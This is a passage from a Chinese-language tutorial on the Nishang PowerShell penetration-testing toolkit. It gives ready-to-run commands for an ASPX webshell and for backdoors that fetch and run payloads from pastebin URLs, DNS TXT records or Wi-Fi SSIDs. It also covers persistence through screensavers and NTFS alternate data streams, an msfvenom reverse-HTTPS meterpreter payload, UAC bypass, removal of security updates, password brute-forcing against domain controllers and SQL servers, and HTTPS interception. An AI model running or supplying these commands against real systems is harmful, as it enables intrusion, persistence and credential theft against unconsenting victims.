#### Antak
一个ASPX的Webshell，通过这个Webshell可以编码、执行脚本，上传、下载文件。 ![Antak_UI][7] 执行方式：
    上传Webshell后把它当成一个正常的Powershell执行窗口来使用
    上传和下载文件，只需要填写好对应路径点击上传、下载按钮即可
关于Antak
Webshell的更多介绍，请参考：
### 3.后门
#### HTTP-Backdoor
HTTP-Backdoor可以帮助我们在目标机器上下载和执行Powershell脚本 执行方式：
    PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis
下面解释下几个比较重要的参数：
  * CheckURL 给出一个URL地址，如果存在我们MagicString中的值就去执行Payload – 下载运行我们的脚本
  * PayloadURL 这个参数给出我们需要下载的Powershell脚本的地址
  * Arguments 这个参数指定我们要执行的函数
  * StopString 这个参数也会去看是否存在我们CheckURL返回的字符串，如果存在就会停止执行
#### DNS_TXT_Pwnage
利用DNS隧道来进行信息传输、通信的小技巧已经不少见了。在Nishang中也集成了一个通过DNS
TXT来接收命令或者脚本的后门脚本。使用DNS_TXT_Pwnage这个脚本，我们一般需要配合Utility下的Out-DnsTxt使用。
所以这里首先说下Out-DnsTxt的使用：
    PS >Out-DnsTxt -DataToEncode path //path处是你想编码的内容的路径
之后，它会生成一个编码后的文件，如下图所示
然后我们去添加对应的TXT记录就行了，encoded.txt文件中每一行为一条记录 添加完后我们还需要添加两条TXT记录，内容为start和stop
添加完成后，我们就可以利用DNS_TXT_Pwnage这个脚本了 执行方式：
    PS >DNS_TXT_Pwnage -startdomain start.test.com -cmdstring start -commanddomain command.test.com -psstring test -psdomain xxx.test.com -Subdomains 1 -StopString stop
具体参数的意思：
  * startdomain 会一直去检测我们指定域名的TXT记录，并把返回的记录与我们输入的cmdstring以及psstring进行比较
  * cmdstring 是我们任意输入的字符串，如果startdomain与我们这里输入的cmdstring值相等则执行commanddomain命令
  * commanddomain 创建的执行命令TXT记录的域名
  * psstring 是我们任意输入的字符串，如果与我们这里输入的psstring值相等则执行psdomain脚本
  * psdomain 是我们创建的执行脚本TXT记录的域名
  * Subdomains 是执行脚本创建TXT记录的个数
  * StopString 是任意输入的字符串，如果这里输入的字符串与startdomain中返回的记录相同将会停止执行我们的Payload
  * Arguments 指定要执行的函数名
#### Execute-OnTime
执行方式：
    PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload
具体参数的意思：
  * PayloadURL 指定我们脚本下载的地址
  * Arguments 指定执行的函数名
  * Time 参数可以设定脚本执行的时间（例如 -Time 23:21）
  * CheckURL 参数会检测我们一个指定的URL内容是否存在StopString给出的字符串，如果发现了就停止执行
#### Gupt-Backdoor
Gupt-Backdoor这个脚本可以帮助我们通过无线SSID反弹后门和执行命令。 执行方式：
    PS >Gupt-Backdoor -MagicString test -Verbose
这里解释一下MagicString这个参数： MagicString开头的4个字符是用来识别我们建立的WIFI
SSID的。例如，这里是test，Gupt后门会去自动匹配我们WIFI中SSID以test开头的。而MagicString这个参数从第五个字符开始就决定了我们是执行命令或是下载脚本。
需要注意的是：
  * 如果它的第五个字符是c就代表执行命令。 例如：-MagicString testcwhoami 就会匹配WIFI SSID为test的，并执行命令whoami
  * 如果它的第五个字符是u的话就代表下载脚本。 例如：-MagicString testuXXXX 就会匹配WIFI SSID为test的，并默认下载http://goo.gl/XXXX （其中http://goo.gl可在脚本的$PayloadURL参数中修改）
  * 还可以用Arguments参数来指定下载脚本 例如： PS >Gupt-Backdoor -MagicString test -Argument Get-Information -Verbose 就可以下载Get-Information的脚本了
补充 Windows下创建一个WIFI：
    cmd
    netsh wlan set hostednetwork mode=allow
    netsh wlan set hostednetwork ssid=test key=1234567890
    netsh wlan start hostednetwork
#### Add-ScrnSaveBackdoor
这个脚本可以帮助我们利用Windows的屏保来留下一个隐藏的后门 执行方式：
    PS >Add-ScrnSaveBackdoor -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process" //使用这条语句可以执行我们自己的Payload
    PS >Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor 
    http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis //利用这条命令可以从powershell执行一个HTTP-Backdoor
    PS >Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/code_exec.ps1  //还可以使用msfvenom先生成一个powershell (./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.254.226 -f powershell)，然后利用这条命令返回一个meterpreter
其他具体的参数的意思和我们上面介绍的一些后门是类似的
  * PayloadURL 指定我们需要下载的脚本地址
  * Arguments 指定我们要执行的函数以及相关参数
#### Invoke-ADSBackdoor
这个脚本是使用NTFS数据流留下一个永久性后门。其实，由NTFS数据流带来的一些安全问题的利用并不少见了（如：利用NTFS数据流在Mysql
UDF提权中创建lib/plugin目录），大家可以参考《[NTFS
ADS带来的WEB安全问题](http://wenku.baidu.com/view/22e049f55022aaea998f0f7c.html?from=search)》
这个脚本可以向ADS中注入代码并且以普通用户权限运行 执行方式：
    PS >Invoke-ADSBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor "http://pastebin.
    com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis
这个脚本主要有两个参数，在上面介绍其他后门当中已经说明了，这里是类似的
需要说明的是，执行后它会在AppData的目录下建立一个ads并把我们的Payload注入进去，如果我们希望在cmd下看到我们这里建立的ads，需要使用：dir
/a /r
### 4.客户端
对于这一部分的脚本，我就不再赘述了，因为网上早已经有了对于这一部分脚本的介绍说明： [使用Powershell Client进行有效钓鱼][8]
### 5.权限提升
#### Enable-DuplicateToken
这个脚本可以帮助我们在已经获得了一定权限的情况下，使我们提升到System权限。 执行方式
    PS > Enable-DuplicateToken
具体的相关介绍可以查阅：
#### Remove-Update
这个脚本可以帮助我们移除系统所有的更新，或所有安全更新，以及指定编号的更新。 执行方式：
    PS > Remove-Update All       //移除目标机器上的所有更新
    PS > Remove-Update Security  //移除目标机器上所有安全相关更新
    PS > Remove-Update KB2761226 //移除指定编号的更新
#### Invoke-PsUACme
Invoke-PsUACme使用了来自于UACME项目的DLL来Bypass UAC。
上表给出了各种UAC绕过的方法，我们可以在Invoke-PsUACme中指定相应方法执行。 执行方式：
    PS > Invoke-PsUACme -Verbose //使用Sysprep方法和默认的Payload执行
    PS > Invoke-PsUACme -method oobe -Verbose //使用oobe方法和默认的Payload执行
    PS > Invoke-PsUACme -method oobe -Payload "powershell -windowstyle hidden -e YourEncodedPayload" //使用-Payload参数可以自行指定要执行的Payload
除开以上而外，我们还可以使用-PayloadPath参数来指定Payload的路径，默认情况下Payload会在C:\Windows\Temp\cmd.bat结束。还可以使用-CustomDLL64（64位）或-CustomDLL32（32位）参数来自定义一个DLL文件。
### 6.扫描
#### Invoke-BruteForce
这个脚本可以对SQL Server、域控制器、Web以及FTP进行口令的爆破 执行方式：
    PS > Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose //爆破域控制器
    PS > Invoke-BruteForce -ComputerName SQLServ01 -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose  //爆破SQL Server
    PS > cat C:\test\servers.txt | Invoke-BruteForce -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose  //爆破server.txt中所有servers的SQL Server
主要的参数：
  * ComputerName 用于指定对应服务的计算机名
  * UserList 用户名字典
  * PasswordList 密码字典
  * Service 服务类型（注意默认为：SQL）
  * StopOnSuccess 成功找到一个后就停止执行
#### Invoke-PortScan
利用这个脚本我们可以在目标机器上对内网进行端口扫描 执行方式：
    PS >Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80
主要的参数：
  * StartAddress 扫描范围开始的地址
  * EndAddress 扫描范围结束的地址
  * ScanPort 进行端口扫描
  * Port 指定扫描端口（默认扫描端口：21,22,23,53,69,71,80,98,110,139,111, 389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901）
  * TimeOut 设置超时时间
### 7.中间人
#### Invoke-Interceptor
这个脚本可以通过建立一个代理服务器的方式来拦截HTTPS的请求，并将这些请求记录下来 执行方式：
    PS >Invoke-Interceptor -ProxyServer 192.168.230.21 -ProxyPort 3128 //这条命令将默认在8081端口监听并把请求发送给上游代理的3128端口
可以通过ListenPort来修改我们目标机器上的监听端口（默认8081端口） 例如 我们在目标机器上执行：
然后这里本机我用NC来监听对应端口：
接收到了来自目标机的请求数据
并且这个脚本会在目标机的TEMP目录下生成interceptor.log的文件来记录请求数据
### Nishang结语
Nishang这款基于PowerShell的渗透测试专用工具集成了非常多实用的脚本与框架，方便我们在渗透测试过程之中使用。尽管，在一些环境下我们可能没有办法去执行Powershell，但是通过查看这些脚本的具体代码，我们也可以自己去完成实现脚本提供的一些功能。限于篇幅，本文只能抛砖引玉地介绍Nishang的部分功能，希望大家能够在实际的应用之中去体验。
## 总结
好了，目前关于Powershell的东西已经分享完啦，中间一些内容或许有些错误，之后如果还有更新请关注我的[GitBook](https://rootclay.gitbooks.io/powershell-attack-guide/content/)，最后先卖一波红线～，大家不知道红线是什么的话可以扫一扫:)